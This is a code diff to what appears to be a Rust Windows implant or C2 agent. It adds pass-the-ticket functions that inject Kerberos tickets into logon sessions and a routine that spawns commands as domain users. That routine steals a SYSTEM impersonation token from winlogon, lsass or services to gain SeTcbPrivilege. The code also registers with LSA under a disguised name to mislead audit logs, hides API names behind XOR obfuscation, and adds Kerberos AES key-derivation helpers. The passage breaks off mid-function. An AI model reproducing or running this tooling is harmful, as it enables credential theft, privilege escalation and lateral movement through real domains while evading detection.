@@ -1058,18 +1058,25 @@ fn cred_ptt(v: &serde_json::Value) -> TaskOutput {
     //   key_type(4) + key_length(4) + key_offset(4) +
     //   kerb_cred_size(4) + kerb_cred_offset(4)  = 36 bytes header
     //   + ticket_bytes immediately after
+    // KERB_SUBMIT_TKT_REQUEST layout (x64):
+    //   +0  MessageType(4) = 21
+    //   +4  LUID.LowPart(4) = 0 (current logon)
+    //   +8  LUID.HighPart(4) = 0
+    //   +12 Flags(4) = 0
+    //   +16 KERB_CRYPTO_KEY32.KeyType(4) = 0
+    //   +20 KERB_CRYPTO_KEY32.Length(4) = 0
+    //   +24 KERB_CRYPTO_KEY32.Offset(4) = 0
+    //   +28 KerbCredSize(4)
+    //   +32 KerbCredOffset(4) = 36 (immediately after header)
+    //   total header = 36 bytes
     let hdr_size = 36usize;
     let total = hdr_size + ticket_bytes.len();
     let mut req = vec![0u8; total];
     unsafe {
         let p = req.as_mut_ptr();
-        *(p       as *mut u32) = 21;                          // KerbSubmitTicketMessage
-        // luid = {0,0} = current user
-        *(p.add(8) as *mut u32) = 0;                          // flags
-        // KERB_CRYPTO_KEY32 at +12: {type=0, length=0, offset=0}
-        *(p.add(24) as *mut u32) = ticket_bytes.len() as u32; // KerbCredSize
-        *(p.add(28) as *mut u32) = hdr_size as u32;           // KerbCredOffset
-        // copy ticket immediately after header
+        *(p        as *mut u32) = 21;                          // KerbSubmitTicketMessage
+        *(p.add(28) as *mut u32) = ticket_bytes.len() as u32; // KerbCredSize
+        *(p.add(32) as *mut u32) = hdr_size as u32;           // KerbCredOffset
         core::ptr::copy_nonoverlapping(ticket_bytes.as_ptr(), p.add(hdr_size), ticket_bytes.len());
     }
 
@@ -1088,6 +1095,441 @@ fn cred_ptt(v: &serde_json::Value) -> TaskOutput {
         ))
     } else {
         TaskOutput::success(b"ptt: ticket injected into current logon session".to_vec())
+    }
+}
+
+// ── Helpers for spawn-with-domain-token (used by opth cmd execution) ──────────
+
+// Inject a KRB-CRED blob into a specific logon session (identified by LUID).
+// When luid_low == 0 && luid_high == 0 → current session (same as cred_ptt).
+#[cfg(target_os = "windows")]
+fn lsa_inject_ticket(kirbi: &[u8], luid_low: u32, luid_high: i32) -> Result<(), String> {
+    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
+    type LsaConnFn = unsafe extern "system" fn(*mut isize) -> i32;
+    type LsaLookFn = unsafe extern "system" fn(isize, *const u8, *mut u32) -> i32;
+    type LsaCallFn = unsafe extern "system" fn(isize, u32, *const u8, u32, *mut *mut u8, *mut u32, *mut i32) -> i32;
+    type LsaFreeFn = unsafe extern "system" fn(*mut u8) -> i32;
+
+    let secur32 = {
+        let mut b = crate::loader::get_module_base(
+            // secur32.dll\0
+            crate::obfs::dec(&[0x29,0x3F,0x39,0x2F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
+        ) as usize;
+        if b == 0 {
+            let n = crate::obfs::dec(&[0x29,0x3F,0x39,0x2F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
+            b = unsafe { LoadLibraryA(n.as_ptr()) } as usize;
+        }
+        b
+    };
+
+    let lsa_lib = {
+        let n = crate::obfs::dec(&[0x29,0x29,0x2A,0x33,0x39,0x36,0x33,0x74,0x3E,0x36,0x36,0x5A]);
+        let mut s = crate::loader::get_module_base(n.as_ptr()) as usize;
+        if s == 0 { s = unsafe { LoadLibraryA(n.as_ptr()) } as usize; }
+        if s == 0 { return Err("lsa_inject: sspicli not found".into()); }
+        s
+    };
+
+    macro_rules! lsa_get { ($enc:expr, $ty:ty) => {{
+        let p = unsafe { crate::loader::get_export_by_name(lsa_lib, crate::obfs::dec($enc).as_ptr()) }
+            .or_else(|| if secur32 != 0 {
+                unsafe { crate::loader::get_export_by_name(secur32, crate::obfs::dec($enc).as_ptr()) }
+            } else { None });
+        match p {
+            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+            None    => return Err(format!("lsa_inject: fn not found")),
+        }
+    }}}
+
+    let fn_connect = lsa_get!(&[0x16,0x29,0x3B,0x19,0x35,0x34,0x34,0x3F,0x39,0x2E,0x0F,0x34,
+                                  0x2E,0x28,0x2F,0x29,0x2E,0x3F,0x3F,0x5A], LsaConnFn);
+    let fn_lookup  = lsa_get!(&[0x16,0x29,0x3B,0x16,0x35,0x35,0x31,0x2F,0x2A,0x1B,0x2F,0x2E,
+                                  0x32,0x3F,0x34,0x2E,0x33,0x39,0x3B,0x2E,0x33,0x35,0x34,0x0A,
+                                  0x3B,0x39,0x31,0x3B,0x3D,0x3F,0x5A], LsaLookFn);
+    let fn_call    = lsa_get!(&[0x16,0x29,0x3B,0x19,0x3B,0x36,0x36,0x1B,0x2F,0x2E,0x32,0x3F,
+                                  0x34,0x2E,0x33,0x39,0x3B,0x2E,0x33,0x35,0x34,0x0A,0x3B,0x39,
+                                  0x31,0x3B,0x3D,0x3F,0x5A], LsaCallFn);
+    let fn_free: Option<LsaFreeFn> = {
+        let enc = &[0x16u8,0x29,0x3B,0x1C,0x28,0x3F,0x3F,0x12,0x3F,0x2E,0x2F,0x28,
+                    0x34,0x18,0x2F,0x3C,0x3C,0x3F,0x28,0x5A];
+        unsafe { crate::loader::get_export_by_name(lsa_lib, crate::obfs::dec(enc).as_ptr()) }
+            .or_else(|| unsafe { crate::loader::get_export_by_name(secur32, crate::obfs::dec(enc).as_ptr()) })
+            .map(|p| unsafe { core::mem::transmute::<_, LsaFreeFn>(p) })
+    };
+
+    let mut lsa_hdl: isize = 0;
+    if unsafe { fn_connect(&mut lsa_hdl) } != 0 {
+        return Err("lsa_inject: LsaConnectUntrusted failed".into());
+    }
+    let pkg_name = b"Kerberos";
+    let mut lsa_str = [0u8; 16];
+    unsafe {
+        *(lsa_str.as_mut_ptr() as *mut u16)        = pkg_name.len() as u16;
+        *(lsa_str.as_mut_ptr().add(2) as *mut u16) = pkg_name.len() as u16;
+        *(lsa_str.as_mut_ptr().add(8) as *mut *const u8) = pkg_name.as_ptr();
+    }
+    let mut auth_pkg_id: u32 = 0;
+    if unsafe { fn_lookup(lsa_hdl, lsa_str.as_ptr(), &mut auth_pkg_id) } != 0 {
+        return Err("lsa_inject: LsaLookupAuthenticationPackage failed".into());
+    }
+
+    let hdr_size = 36usize;
+    let total = hdr_size + kirbi.len();
+    let mut req = vec![0u8; total];
+    unsafe {
+        let p = req.as_mut_ptr();
+        *(p as *mut u32)         = 21;                        // KerbSubmitTicketMessage
+        *(p.add(4)  as *mut u32) = luid_low;                  // LUID.LowPart
+        *(p.add(8)  as *mut i32) = luid_high;                 // LUID.HighPart
+        if luid_low != 0 || luid_high != 0 {
+            *(p.add(12) as *mut u32) = 1;                     // KERB_SUBMIT_TKT_USE_LOGON_ID
+        }
+        *(p.add(28) as *mut u32) = kirbi.len() as u32;        // KerbCredSize
+        *(p.add(32) as *mut u32) = hdr_size as u32;           // KerbCredOffset = 36
+        core::ptr::copy_nonoverlapping(kirbi.as_ptr(), p.add(hdr_size), kirbi.len());
+    }
+
+    let mut resp_ptr: *mut u8 = core::ptr::null_mut();
+    let mut resp_len: u32 = 0;
+    let mut sub_status: i32 = 0;
+    let cs = unsafe {
+        fn_call(lsa_hdl, auth_pkg_id, req.as_ptr(), total as u32,
+                &mut resp_ptr, &mut resp_len, &mut sub_status)
+    };
+    if !resp_ptr.is_null() { unsafe { if let Some(f) = fn_free { f(resp_ptr); } } }
+
+    if cs != 0 || sub_status != 0 {
+        Err(format!("lsa_inject: call={cs:#x} sub={sub_status:#x}"))
+    } else {
+        Ok(())
+    }
+}
+
+// Spawn a command as a domain user (LOGON_NETCREDENTIALS_ONLY), inject the
+// provided TGT into that new logon session, then resume the process.
+//
+// Injection path: steal a SYSTEM impersonation token → LsaRegisterLogonProcess
+// (requires SeTcbPrivilege, now active via thread impersonation) → submit the
+// ticket to the child's LUID → RevertToSelf → resume.
+#[cfg(target_os = "windows")]
+fn spawn_opth_cmd(user: &str, domain: &str, kirbi: &[u8], cmd_str: &str) -> String {
+    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::Security::{GetTokenInformation, TOKEN_STATISTICS, TokenStatistics, TOKEN_QUERY};
+    use windows_sys::Win32::System::Threading::{
+        OpenProcess, OpenProcessToken, ResumeThread, WaitForSingleObject,
+        PROCESS_INFORMATION, STARTUPINFOW, CREATE_NO_WINDOW,
+    };
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
+        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+    };
+
+    let adv = crate::loader::get_module_base(
+        crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
+    ) as usize;
+    if adv == 0 { return "spawn_opth: advapi32 not found".into(); }
+
+    type CreateProcFn = unsafe extern "system" fn(
+        *const u16, *const u16, *const u16, u32,
+        *const u16, *mut u16, u32, *const u8, *const u16,
+        *const STARTUPINFOW, *mut PROCESS_INFORMATION,
+    ) -> BOOL;
+    let fn_create: CreateProcFn = match unsafe {
+        crate::loader::get_export_by_name(adv,
+            crate::obfs::dec(&[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,
+                               0x29,0x0D,0x33,0x2E,0x32,0x16,0x35,0x3D,0x35,0x34,0x0D,0x5A]).as_ptr())
+    } {
+        Some(p) => unsafe { core::mem::transmute(p) },
+        None    => return "spawn_opth: CreateProcessWithLogonW not found".into(),
+    };
+
+    // Output via temp file — CreateProcessWithLogonW never inherits pipe handles
+    let ns = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().subsec_nanos();
+    let tmp = format!("C:\\Windows\\Temp\\dm_{ns}.tmp");
+
+    let to_wide = |s: &str| -> Vec<u16> { s.encode_utf16().chain(core::iter::once(0u16)).collect() };
+    let w_user   = to_wide(user);
+    let w_domain = to_wide(domain);
+    let w_pass   = to_wide("x");
+    let mut w_cmd: Vec<u16> = format!("cmd.exe /C ({cmd_str}) >\"{tmp}\" 2>&1")
+        .encode_utf16().chain(core::iter::once(0u16)).collect();
+
+    let mut si: STARTUPINFOW = unsafe { core::mem::zeroed() };
+    si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
+    let mut child_pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
+
+    const LOGON_NETCREDENTIALS_ONLY: u32 = 2;
+    const CREATE_SUSPENDED: u32 = 0x4;
+
+    let ok = unsafe {
+        fn_create(
+            w_user.as_ptr(), w_domain.as_ptr(), w_pass.as_ptr(),
+            LOGON_NETCREDENTIALS_ONLY,
+            core::ptr::null(), w_cmd.as_mut_ptr(),
+            CREATE_SUSPENDED | CREATE_NO_WINDOW,
+            core::ptr::null(), core::ptr::null(),
+            &si, &mut child_pi,
+        )
+    };
+    if ok == 0 {
+        return format!("spawn_opth: CreateProcessWithLogonW: {:#010x}", unsafe { GetLastError() });
+    }
+
+    // Read the child's logon session LUID from its process token
+    let child_luid: Option<(u32, i32)> = unsafe {
+        let mut h_tok: isize = 0;
+        if OpenProcessToken(child_pi.hProcess, TOKEN_QUERY, &mut h_tok) != 0 {
+            let mut stats: TOKEN_STATISTICS = core::mem::zeroed();
+            let mut ret_len: u32 = 0;
+            GetTokenInformation(h_tok, TokenStatistics,
+                &mut stats as *mut _ as *mut _,
+                core::mem::size_of::<TOKEN_STATISTICS>() as u32, &mut ret_len);
+            CloseHandle(h_tok);
+            Some((stats.AuthenticationId.LowPart, stats.AuthenticationId.HighPart))
+        } else { None }
+    };
+
+    // Inject TGT into the child's logon session while impersonating SYSTEM
+    if let Some((luid_low, luid_high)) = child_luid {
+        let sys_hashes = [
+            crate::obfs::djb2(b"winlogon.exe"),
+            crate::obfs::djb2(b"lsass.exe"),
+            crate::obfs::djb2(b"services.exe"),
+        ];
+        let sys_pid: Option<u32> = unsafe {
+            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            let mut found: Option<u32> = None;
+            if snap != INVALID_HANDLE_VALUE {
+                let mut e: PROCESSENTRY32W = core::mem::zeroed();
+                e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
+                if Process32FirstW(snap, &mut e) != 0 {
+                    loop {
+                        let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
+                        let name: Vec<u8> = String::from_utf16_lossy(&e.szExeFile[..nlen])
+                            .to_ascii_lowercase().into_bytes();
+                        if sys_hashes.contains(&crate::obfs::djb2(&name)) {
+                            found = Some(e.th32ProcessID);
+                            break;
+                        }
+                        e = core::mem::zeroed();
+                        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
+                        if Process32NextW(snap, &mut e) == 0 { break; }
+                    }
+                }
+                CloseHandle(snap);
+            }
+            found
+        };
+
+        if let Some(pid) = sys_pid {
+            // PROCESS_QUERY_INFORMATION = 0x0400
+            let h_sys = unsafe { OpenProcess(0x0400, 0, pid) };
+            if h_sys != 0 {
+                // On Windows 10+, advapi32 forwards many token functions to kernelbase.
+                // Our get_export_by_name now skips forwarders and returns None, so we
+                // must check kernelbase.dll as a fallback.
+                let kb = crate::loader::get_module_base(
+                    // kernelbase.dll\0
+                    crate::obfs::dec(&[0x31,0x3F,0x28,0x34,0x3F,0x36,0x38,0x3B,0x29,0x3F,
+                                       0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
+                ) as usize;
+
+                let lookup = |enc: &[u8]| -> Option<*const u8> {
+                    unsafe { crate::loader::get_export_by_name(adv, crate::obfs::dec(enc).as_ptr()) }
+                        .or_else(|| if kb != 0 {
+                            unsafe { crate::loader::get_export_by_name(kb, crate::obfs::dec(enc).as_ptr()) }
+                        } else { None })
+                };
+
+                type OpenTokFn = unsafe extern "system" fn(isize, u32, *mut isize) -> i32;
+                type DupTokFn  = unsafe extern "system" fn(isize, u32, *mut u8, u32, u32, *mut isize) -> i32;
+                type ImpFn     = unsafe extern "system" fn(isize) -> i32;
+                type RevFn     = unsafe extern "system" fn() -> i32;
+
+                // OpenProcessToken\0
+                let p_otok = lookup(&[0x15,0x2A,0x3F,0x34,0x0A,0x28,0x35,0x39,0x3F,0x29,
+                                      0x29,0x0E,0x35,0x31,0x3F,0x34,0x5A]);
+                // DuplicateTokenEx\0
+                let p_dtok = lookup(&[0x1E,0x2F,0x2A,0x36,0x33,0x39,0x3B,0x2E,0x3F,0x0E,
+                                      0x35,0x31,0x3F,0x34,0x1F,0x22,0x5A]);
+                // ImpersonateLoggedOnUser\0
+                let p_imp  = lookup(&[0x13,0x37,0x2A,0x3F,0x28,0x29,0x35,0x34,0x3B,0x2E,
+                                      0x3F,0x16,0x35,0x3D,0x3D,0x3F,0x3E,0x15,0x34,0x0F,
+                                      0x29,0x3F,0x28,0x5A]);
+                // RevertToSelf\0
+                let p_rev  = lookup(&[0x08,0x3F,0x2C,0x3F,0x28,0x2E,0x0E,0x35,0x09,0x3F,
+                                      0x36,0x3C,0x5A]);
+
+                if let (Some(ot), Some(dt), Some(ip), Some(rv)) = (p_otok, p_dtok, p_imp, p_rev) {
+                    let fn_otok: OpenTokFn = unsafe { core::mem::transmute(ot) };
+                    let fn_dtok: DupTokFn  = unsafe { core::mem::transmute(dt) };
+                    let fn_imp:  ImpFn     = unsafe { core::mem::transmute(ip) };
+                    let fn_rev:  RevFn     = unsafe { core::mem::transmute(rv) };
+
+                    // TOKEN_DUPLICATE=0x2 | TOKEN_QUERY=0x8
+                    let mut h_sys_tok: isize = 0;
+                    if unsafe { fn_otok(h_sys, 0x0002 | 0x0008, &mut h_sys_tok) } != 0 {
+                        let mut h_imp_tok: isize = 0;
+                        // SecurityImpersonation=2, TokenImpersonation=2, TOKEN_ALL_ACCESS=0xF01FF
+                        let dup_ok = unsafe {
+                            fn_dtok(h_sys_tok, 0xF01FF, core::ptr::null_mut(), 2, 2, &mut h_imp_tok)
+                        };
+                        unsafe { CloseHandle(h_sys_tok); }
+
+                        if dup_ok != 0 {
+                            // Only inject if impersonation succeeds (gives SeTcbPrivilege)
+                            if unsafe { fn_imp(h_imp_tok) } != 0 {
+                                let _ = lsa_privileged_inject_ticket(kirbi, luid_low, luid_high);
+                                unsafe { fn_rev(); }
+                            }
+                            unsafe { CloseHandle(h_imp_tok); }
+                        }
+                    }
+                }
+                unsafe { CloseHandle(h_sys); }
+            }
+        }
+    }
+
+    unsafe { ResumeThread(child_pi.hThread); CloseHandle(child_pi.hThread); }
+    unsafe { WaitForSingleObject(child_pi.hProcess, 30_000); CloseHandle(child_pi.hProcess); }
+
+    let output = std::fs::read_to_string(&tmp).unwrap_or_default();
+    let _ = std::fs::remove_file(&tmp);
+    output
+}
+
+// Inject a KRB-CRED ticket into `luid_low/luid_high` via a privileged LSA
+// handle obtained through LsaRegisterLogonProcess, which requires SeTcbPrivilege.
+// Must be called while the calling thread is impersonating a SYSTEM token.
+#[cfg(target_os = "windows")]
+fn lsa_privileged_inject_ticket(kirbi: &[u8], luid_low: u32, luid_high: i32) -> Result<(), String> {
+    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
+
+    let lsa_lib = {
+        // sspicli.dll\0
+        let n = crate::obfs::dec(&[0x29,0x29,0x2A,0x33,0x39,0x36,0x33,0x74,0x3E,0x36,0x36,0x5A]);
+        let mut s = crate::loader::get_module_base(n.as_ptr()) as usize;
+        if s == 0 { s = unsafe { LoadLibraryA(n.as_ptr()) } as usize; }
+        if s == 0 { return Err("lsa_priv: sspicli not found".into()); }
+        s
+    };
+    let secur32 = {
+        // secur32.dll\0
+        let n = crate::obfs::dec(&[0x29,0x3F,0x39,0x2F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
+        let mut s = crate::loader::get_module_base(n.as_ptr()) as usize;
+        if s == 0 { s = unsafe { LoadLibraryA(n.as_ptr()) } as usize; }
+        s
+    };
+
+    macro_rules! lsa_fn { ($enc:expr, $ty:ty) => {{
+        let p = unsafe { crate::loader::get_export_by_name(lsa_lib, crate::obfs::dec($enc).as_ptr()) }
+            .or_else(|| if secur32 != 0 {
+                unsafe { crate::loader::get_export_by_name(secur32, crate::obfs::dec($enc).as_ptr()) }
+            } else { None });
+        match p {
+            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+            None    => return Err("lsa_priv: fn not found".into()),
+        }
+    }}}
+
+    type LsaRegFn  = unsafe extern "system" fn(*const u8, *mut isize, *mut u32) -> i32;
+    type LsaLookFn = unsafe extern "system" fn(isize, *const u8, *mut u32) -> i32;
+    type LsaCallFn = unsafe extern "system" fn(isize, u32, *const u8, u32, *mut *mut u8, *mut u32, *mut i32) -> i32;
+    type LsaFreeFn = unsafe extern "system" fn(*mut u8) -> i32;
+    type LsaDeregFn= unsafe extern "system" fn(isize) -> i32;
+
+    // LsaRegisterLogonProcess\0
+    let fn_reg = lsa_fn!(&[0x16u8,0x29,0x3B,0x08,0x3F,0x3D,0x33,0x29,0x2E,0x3F,0x28,
+                            0x16,0x35,0x3D,0x35,0x34,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x5A], LsaRegFn);
+    // LsaLookupAuthenticationPackage\0
+    let fn_look = lsa_fn!(&[0x16,0x29,0x3B,0x16,0x35,0x35,0x31,0x2F,0x2A,0x1B,0x2F,0x2E,
+                             0x32,0x3F,0x34,0x2E,0x33,0x39,0x3B,0x2E,0x33,0x35,0x34,0x0A,
+                             0x3B,0x39,0x31,0x3B,0x3D,0x3F,0x5A], LsaLookFn);
+    // LsaCallAuthenticationPackage\0
+    let fn_call = lsa_fn!(&[0x16,0x29,0x3B,0x19,0x3B,0x36,0x36,0x1B,0x2F,0x2E,0x32,0x3F,
+                             0x34,0x2E,0x33,0x39,0x3B,0x2E,0x33,0x35,0x34,0x0A,0x3B,0x39,
+                             0x31,0x3B,0x3D,0x3F,0x5A], LsaCallFn);
+    let fn_free: Option<LsaFreeFn> = {
+        let enc = &[0x16u8,0x29,0x3B,0x1C,0x28,0x3F,0x3F,0x12,0x3F,0x2E,0x2F,0x28,
+                    0x34,0x18,0x2F,0x3C,0x3C,0x3F,0x28,0x5A];
+        unsafe { crate::loader::get_export_by_name(lsa_lib, crate::obfs::dec(enc).as_ptr()) }
+            .or_else(|| if secur32 != 0 {
+                unsafe { crate::loader::get_export_by_name(secur32, crate::obfs::dec(enc).as_ptr()) }
+            } else { None })
+            .map(|p| unsafe { core::mem::transmute::<_, LsaFreeFn>(p) })
+    };
+    let fn_dereg: Option<LsaDeregFn> = {
+        // LsaDeregisterLogonProcess\0
+        let enc = &[0x16u8,0x29,0x3B,0x1E,0x3F,0x28,0x3F,0x3D,0x33,0x29,0x2E,0x3F,0x28,
+                    0x16,0x35,0x3D,0x35,0x34,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x5A];
+        unsafe { crate::loader::get_export_by_name(lsa_lib, crate::obfs::dec(enc).as_ptr()) }
+            .or_else(|| if secur32 != 0 {
+                unsafe { crate::loader::get_export_by_name(secur32, crate::obfs::dec(enc).as_ptr()) }
+            } else { None })
+            .map(|p| unsafe { core::mem::transmute::<_, LsaDeregFn>(p) })
+    };
+
+    // Register as a trusted logon process (name shown in auth audit logs)
+    let proc_name = b"MSFT";
+    let mut lsa_str = [0u8; 16];
+    unsafe {
+        *(lsa_str.as_mut_ptr()            as *mut u16)       = proc_name.len() as u16;
+        *(lsa_str.as_mut_ptr().add(2)     as *mut u16)       = proc_name.len() as u16;
+        *(lsa_str.as_mut_ptr().add(8)     as *mut *const u8) = proc_name.as_ptr();
+    }
+    let mut lsa_hdl: isize = 0;
+    let mut mode: u32 = 0;
+    let reg_st = unsafe { fn_reg(lsa_str.as_ptr(), &mut lsa_hdl, &mut mode) };
+    if reg_st != 0 {
+        return Err(format!("lsa_priv: LsaRegisterLogonProcess: {reg_st:#x}"));
+    }
+
+    let pkg_name = b"Kerberos";
+    let mut pkg_str = [0u8; 16];
+    unsafe {
+        *(pkg_str.as_mut_ptr()            as *mut u16)       = pkg_name.len() as u16;
+        *(pkg_str.as_mut_ptr().add(2)     as *mut u16)       = pkg_name.len() as u16;
+        *(pkg_str.as_mut_ptr().add(8)     as *mut *const u8) = pkg_name.as_ptr();
+    }
+    let mut auth_pkg_id: u32 = 0;
+    if unsafe { fn_look(lsa_hdl, pkg_str.as_ptr(), &mut auth_pkg_id) } != 0 {
+        if let Some(f) = fn_dereg { unsafe { f(lsa_hdl); } }
+        return Err("lsa_priv: LsaLookupAuthenticationPackage failed".into());
+    }
+
+    // KerbSubmitTicketMessage (type 21) with the child's LUID.
+    // Flags = KERB_SUBMIT_TKT_USE_LOGON_ID (0x1) at offset 12 tells LSA to use the
+    // LUID fields (offsets 4+8) instead of the caller's current session.
+    let hdr_size = 36usize;
+    let total = hdr_size + kirbi.len();
+    let mut req = vec![0u8; total];
+    unsafe {
+        let p = req.as_mut_ptr();
+        *(p          as *mut u32) = 21;
+        *(p.add(4)   as *mut u32) = luid_low;
+        *(p.add(8)   as *mut i32) = luid_high;
+        *(p.add(12)  as *mut u32) = 1;            // KERB_SUBMIT_TKT_USE_LOGON_ID
+        *(p.add(28)  as *mut u32) = kirbi.len() as u32;
+        *(p.add(32)  as *mut u32) = hdr_size as u32;
+        core::ptr::copy_nonoverlapping(kirbi.as_ptr(), p.add(hdr_size), kirbi.len());
+    }
+
+    let mut resp_ptr: *mut u8 = core::ptr::null_mut();
+    let mut resp_len: u32 = 0;
+    let mut sub_status: i32 = 0;
+    let cs = unsafe {
+        fn_call(lsa_hdl, auth_pkg_id, req.as_ptr(), total as u32,
+                &mut resp_ptr, &mut resp_len, &mut sub_status)
+    };
+    if !resp_ptr.is_null() { unsafe { if let Some(f) = fn_free { f(resp_ptr); } } }
+    if let Some(f) = fn_dereg { unsafe { f(lsa_hdl); } }
+
+    if cs != 0 || sub_status != 0 {
+        Err(format!("lsa_priv: submit={cs:#x} sub={sub_status:#x}"))
+    } else {
+        Ok(())
     }
 }
 
@@ -1180,6 +1622,216 @@ fn cred_pth(v: &serde_json::Value) -> TaskOutput {
     )
 }
 
+// ── AES-256-CTS-HMAC-SHA1-96 helpers (RFC 3962) ──────────────────────────────
+
+#[cfg(target_os = "windows")]
+fn krb_gcd(a: usize, b: usize) -> usize { if b == 0 { a } else { krb_gcd(b, a % b) } }
+
+// RFC 3961 n-fold: expand `input` bytes into `outbytes` bytes.
+#[cfg(target_os = "windows")]
+fn krb_nfold(input: &[u8], outbytes: usize) -> Vec<u8> {
+    let inlen = input.len();
+    if inlen == 0 { return vec![0; outbytes]; }
+    if inlen == outbytes { return input.to_vec(); }
+    let g   = krb_gcd(inlen, outbytes);
+    let reps = outbytes / g;
+    let mut acc = vec![0u32; outbytes];
+    for rep in 0..reps {
+        let rot = (13 * rep) % (inlen * 8);
+        let rb  = rot / 8;
+        let rr  = rot % 8;
+        let start = (rep * inlen) % outbytes;
+        for i in 0..inlen {
+            let s0 = (i + rb) % inlen;
+            let s1 = (i + rb + 1) % inlen;
+            let bv: u8 = if rr == 0 { input[s0] }
+                else { ((input[s0] as u16) << rr | (input[s1] as u16) >> (8 - rr)) as u8 };
+            acc[(start + i) % outbytes] += bv as u32;
+        }
+    }
+    let mut out = vec![0u8; outbytes];
+    let mut carry = 0u32;
+    for i in (0..outbytes).rev() { let s = acc[i] + carry; out[i] = (s & 0xFF) as u8; carry = s >> 8; }
+    let mut i = outbytes - 1;
+    while carry > 0 {
+        let s = out[i] as u32 + carry; out[i] = (s & 0xFF) as u8; carry = s >> 8;
+        i = if i == 0 { outbytes - 1 } else { i - 1 };
+    }
+    out
+}
+
+// AES-256-ECB encrypt a single 16-byte block via BCrypt.
+#[cfg(target_os = "windows")]
+fn bcrypt_aes256_ecb_block(bcrypt_base: usize, key32: &[u8; 32], block: &[u8; 16]) -> Result<[u8; 16], String> {
+    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
+    type OAFn = unsafe extern "system" fn(*mut usize, *const u16, *const u16, u32) -> i32;
+    type SPFn = unsafe extern "system" fn(usize, *const u16, *const u8, u32, u32) -> i32;
+    type GKFn = unsafe extern "system" fn(usize, *mut usize, *mut u8, u32, *const u8, u32, u32) -> i32;
+    type EFn  = unsafe extern "system" fn(usize, *const u8, u32, *const u8, *mut u8, u32, *mut u8, u32, *mut u32, u32) -> i32;
+    type DKFn = unsafe extern "system" fn(usize) -> i32;
+    type CAFn = unsafe extern "system" fn(usize, u32) -> i32;
+
+    macro_rules! bfn { ($enc:expr, $ty:ty) => { {
+        let dec = crate::obfs::dec($enc);
+        match unsafe { crate::loader::get_export_by_name(bcrypt_base, dec.as_ptr()) } {
+            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+            None => return Err(format!("bcrypt: {} not found", core::str::from_utf8(&dec[..dec.len()-1]).unwrap_or("?"))),
+        }
+    } } }
+    // BCryptOpenAlgorithmProvider XOR 0x5A
+    let fn_open  = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x15,0x2A,0x3F,0x34,0x1B,0x36,0x3D,0x35,0x28,0x33,0x2E,0x32,0x37,0x0A,0x28,0x35,0x2C,0x33,0x3E,0x3F,0x28,0x5A], OAFn);
+    // BCryptSetProperty
+    let fn_setprop = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x09,0x3F,0x2E,0x0A,0x28,0x35,0x2A,0x3F,0x28,0x2E,0x23,0x5A], SPFn);
+    // BCryptGenerateSymmetricKey
+    let fn_genkey  = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x1D,0x3F,0x34,0x3F,0x28,0x3B,0x2E,0x3F,0x09,0x23,0x37,0x37,0x3F,0x2E,0x28,0x33,0x39,0x11,0x3F,0x23,0x5A], GKFn);
+    // BCryptEncrypt
+    let fn_encrypt = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x1F,0x34,0x39,0x28,0x23,0x2A,0x2E,0x5A], EFn);
+    // BCryptDestroyKey
+    let fn_destrk  = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x1E,0x3F,0x29,0x2E,0x28,0x35,0x23,0x11,0x3F,0x23,0x5A], DKFn);
+    // BCryptCloseAlgorithmProvider
+    let fn_close   = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x19,0x36,0x35,0x29,0x3F,0x1B,0x36,0x3D,0x35,0x28,0x33,0x2E,0x32,0x37,0x0A,0x28,0x35,0x2C,0x33,0x3E,0x3F,0x28,0x5A], CAFn);
+
+    // "AES\0" UTF-16LE
+    let aes_id: [u16; 4] = [0x41, 0x45, 0x53, 0];
+    let mut alg: usize = 0;
+    let s = unsafe { fn_open(&mut alg, aes_id.as_ptr(), core::ptr::null(), 0) };
+    if s < 0 { return Err(format!("BCryptOpenAlg(AES): {s:#x}")); }
+
+    // Set ECB mode: ChainingMode property = "ChainingModeECB\0"
+    let prop: [u16; 13] = [0x43,0x68,0x61,0x69,0x6E,0x69,0x6E,0x67,0x4D,0x6F,0x64,0x65,0];
+    let ecb:  [u16; 16] = [0x43,0x68,0x61,0x69,0x6E,0x69,0x6E,0x67,0x4D,0x6F,0x64,0x65,0x45,0x43,0x42,0];
+    unsafe { fn_setprop(alg, prop.as_ptr(), ecb.as_ptr() as *const u8, (ecb.len() * 2) as u32, 0) };
+
+    // Generate key (512-byte key object is always enough for AES-256)
+    let mut kobj = vec![0u8; 512];
+    let mut khdl: usize = 0;
+    let s = unsafe { fn_genkey(alg, &mut khdl, kobj.as_mut_ptr(), kobj.len() as u32, key32.as_ptr(), 32, 0) };
